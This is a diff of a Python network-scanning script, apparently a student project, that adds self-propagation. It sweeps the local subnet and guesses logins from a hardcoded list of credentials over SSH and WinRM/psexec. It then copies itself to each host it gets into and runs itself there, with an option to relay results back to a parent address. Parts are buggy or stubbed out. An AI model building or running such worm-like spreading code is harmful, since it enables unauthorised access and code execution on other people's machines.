@@ -1,21 +1,31 @@
 import argparse
-import scapy.all as scapy
 import pickle
 import netifaces as ni
 import nmap
 import time
 import socket
 import threading
-
+import paramiko
+import requests
+from scp import SCPClient
+from winrmcp import Client as WinClient
+from pypsexec.client import Client as ps_client
+import winrm
 # TODO: Remove unneeded imports
 BIND_PORT = 9000
 BIND_ADDR = ('0.0.0.0', BIND_PORT)
-
 # List of new hosts found on the scan
 new_hosts = {}
+my_data = {}
+
+creds = []
+creds.append({'user': 'yos', 'pass': 'bos'})
+creds.append({'user': 'kali', 'pass': 'kali'})
+creds.append({'user': 'User', 'pass': 'Matan1245'})
+creds.append({'user': 'Administrator', 'pass': '123456'})
 
 
-class Host():
+class Host:
     def __init__(self, ip, mac=None, os=None) -> None:
         self.ip = ip
         self.mac = mac
@@ -25,44 +35,23 @@ class Host():
 def get_args():  # TODO: Verify this is positional and must + have help
     # Getting args: sm_ip, sm_port
     parser = argparse.ArgumentParser()
-    parser.add_argument('-sI', '--parent_ip', dest='sm_ip',
-                        help='scan manager IP Address/Addresses')
-    parser.add_argument('-sP', '--parent_ip', dest='sm_port',
-                        help='scan manager IP Address/Addresses')
-    options = parser.parse_args()
+    parser.add_argument('parent_ip', type=str,
+                        help='Parent ip address')
+    parser.add_argument('parent_port', type=int,
+                        help='Parent port')
+    parser.add_argument('--relay', '-r',
+                        action='store_true',
+                        help='relay data back to parent',
+                        )
+    # options = parser.parse_args()
+    options = parser.parse_args(['127.0.0.1', '9000'])
 
     # Quit the program if the argument is missing
-    if not options.sm_ip or not options.sm_port:
+    if not options.parent_ip or not options.parent_port:
         # Code to handle if interface is not specified
         parser.error(
             "[-] Please specify an IP Address or Addresses, use --help for more info.")
     return options
-
-
-class Manager():
-    # TODO: Probably should be copied from scan manager
-    def send_scanner(self, ip):
-        # Sends scanner file to target to initiate scan
-        # TODO: GET FROM SAPIR
-        pass
-
-    def run_scanner(self, ip):
-        # Sends scanner file to target to initiate scan
-        # TODO: GET FROM SAPIR
-        pass
-
-    def scan_host(self, ip):
-        # Check if port is open first
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        result = sock.connect_ex((ip, BIND_PORT))
-        status = False
-        if result == 0:
-            print('port OPEN')
-        else:
-            print('port CLOSED')
-            if self.send_scanner(ip):
-                status = self.run_scanner(ip)
-        return status
 
 
 class Communicator():
@@ -138,15 +127,17 @@ class NmapScanner():
         self.scanner = nmap.PortScanner()
 
     def os_detection(self, hosts):
-        scanner = nmap.PortScanner()
-        hostlist = ' '.join(hosts)
-        print('hostlist join:', hostlist)
-        scanner.scan(hosts=hostlist, arguments='-O ')
-        print('hostlist after scan:', scanner.all_hosts())
-        for host in scanner.all_hosts():
-            if scanner[host]['osmatch']:
-                print(scanner[host]['osmatch'][0]['osclass'][0]['osfamily'])
-                new_hosts[host].os = scanner[host]['osmatch'][0]['osclass'][0]['osfamily']
+        s = nmap.PortScanner()
+        hostlist = ' '.join(new_hosts.keys())
+        if hostlist:
+            print('hostlist join:', hostlist)
+            s.scan(hosts=hostlist, arguments='-O ')
+            print('hostlist after scan:', s.all_hosts())
+            for host in s.all_hosts():
+                if s[host]['osmatch']:
+                    print(s[host]['osmatch'][0]['osclass'][0]['osfamily'])
+                    new_hosts[host].os = s[host]['osmatch'][0]['osclass'][0]['osfamily'].lower(
+                    )
 
     def udpscan():
         pass
@@ -154,18 +145,120 @@ class NmapScanner():
     def arp_pingsweep(self, ip):
         scanner = nmap.PortScanner()
         scanner.scan(hosts=ip + '/24', arguments='-PEPM -sn -n')
+        allhosts = scanner.all_hosts()
         hosts_list = [(x, scanner[x]['status']['state'])
-                      for x in scanner.all_hosts()]
+                      for x in allhosts]
         for host, status in hosts_list:
-            new_hosts[host] = Host(scanner[host]['addresses'])
+            new_hosts[host] = Host(scanner[host]['addresses']['ipv4'])
             try:
                 new_hosts[host].mac = scanner[host]['addresses']['mac']
             except KeyError:
-                pass
+                # TODO: Generate mac, for now deleting
+                del new_hosts[host]
+                allhosts.remove(host)
             print(host, status)
-        print('all hosts:', scanner.all_hosts())
-        return scanner.all_hosts()
+        print('all hosts:', allhosts)
+        return allhosts
         # self.os_detection(scanner.all_hosts())
+
+
+class RemoteLogin():
+    """
+    This class manages the remote login and execution part.
+    It recieves username password and server(ip address), and log in to the server with on of the following methods:
+    SSH - if linux machine
+    --- - if windows machine
+    """
+
+    def __init__(self, server, os=None) -> None:
+        self.server = server
+        self.os = os
+
+    def check_port_open(self, port):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        result = sock.connect_ex((self.server, port))
+        if result == 0:
+            return True
+        else:
+            return False
+
+    def scan_host(self):
+        # Check if port is open first
+        status = False
+        if self.check_port_open(BIND_PORT):
+            print(f'{self.server}: port OPEN. Scan already in progress')
+        else:
+            print('port CLOSED')
+            if self.os == 'linux':
+                self.ssh()
+            elif self.os == 'windows':
+                self.windows()
+            else:
+                # Guess
+                if self.check_port_open(22):
+                    status = self.ssh()
+                elif self.check_port_open(5985):
+                    status = self.windows()
+                else:
+                    print(f'{self.server}: Could not run scanner')
+        return status
+
+    def ssh(self):
+        curr_file_location = "networkscanner.py"
+        remote_file_location = "networkscanner.py"
+        scanner_exec_command = "python " + remote_file_location
+        ssh_session = paramiko.SSHClient()
+        ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        logged_in = False
+        for cred in creds:
+            try:
+                ssh_session.connect(self.server, 22,
+                                    username=cred['user'], password=cred['pass'])
+                logged_in = True
+                break
+            except paramiko.ssh_exception.AuthenticationException:
+                pass
+            except TimeoutError:
+                pass
+        if not logged_in:
+            return False
+        with SCPClient(ssh_session.get_transport()) as scp:
+            scp.put(curr_file_location, remote_file_location)
+
+        ssh_stdin, ssh_stdout, ssh_stderr = ssh_session.exec_command(
+            scanner_exec_command)
+        err = ssh_stderr.read().decode()
+        if err:
+            print("Failed to execute scanner script, error: " + err)
+            return False
+        else:
+            print("Scanner script executed successfully!")
+            return True
+# 5985
+
+    def windows(self):
+        # try:
+        scanner_path = "networkscanner.py"
+        for cred in creds:
+            try:
+                client = WinClient(self.server, auth=(
+                    cred['user'], cred['pass']))
+                client.copy(scanner_path, scanner_path)
+                c = ps_client(self.server, username=cred,
+                              password=creds[cred])
+                c.connect()
+                stdout, stderr, rc = c.run_executable("cmd.exe",
+                                                      arguments="python3 "+scanner_path)
+                c.remove_service()
+                c.disconnect()
+                return True
+            except requests.exceptions.ConnectionError as err:
+                print(err)
+                pass
+            except winrm.exceptions.InvalidCredentialsError as err:
+                print(err)
+                pass
+        return False
 
 
 def get_local_ips():
@@ -185,31 +278,37 @@ def get_local_ips():
 
 
 def main():
-    sm_ip = '127.0.0.1'
-    sm_port = 9000
-    communicator = Communicator(sm_ip, sm_port)
-    # communicator.init_relay()
-    nmap_scanner = NmapScanner()
-    # Start scanning
-    local_ips = get_local_ips()
-    for ip in local_ips[0:1]:
-        # TODO: in new thread
-        hosts = nmap_scanner.arp_pingsweep(ip)
-        # nmap_scanner.os_detection(hosts[:4])
-        print(new_hosts)
-        # OPTIONAL: add information gathering commands
+    if False:
+        args = get_args()
+        communicator = Communicator(args.parent_ip, args.parent_port)
+        if args.relay:
+            communicator.init_relay()  # TODO: decide if used by args
+        nmap_scanner = NmapScanner()
+        # Start scanning
+        local_ips = get_local_ips()
+        my_data['ips'] = local_ips
+        for ip in local_ips[3:4]:
+            # TODO: in new thread
+            hosts = nmap_scanner.arp_pingsweep(ip)
+            # nmap_scanner.os_detection(hosts)
 
-    # TODO: after threads -  Wait for all threads to finish
+            # OPTIONAL: add information gathering commands
 
+        # TODO: after threads -  Wait for all threads to finish
+    new_hosts = {'192.168.1.65': Host(
+        '192.168.1.65'), '192.168.1.66': Host('192.168.1.66')}
+    #new_hosts = {}
     # Send results back
-    #communicator = Communicator(options.sm_ip, options.sm_port)
+    my_data['hosts'] = new_hosts
+    # communicator.send_results(my_data)
 
-    communicator.send_results(new_hosts)
-
-    manager = Manager()
     for host in new_hosts:
         print(host)
-        manager.scan_host(host)
+        if new_hosts[host].os:
+            remote = RemoteLogin(host, new_hosts[host].os)
+        else:
+            remote = RemoteLogin(host)
+        remote.scan_host()
 
 
 main()
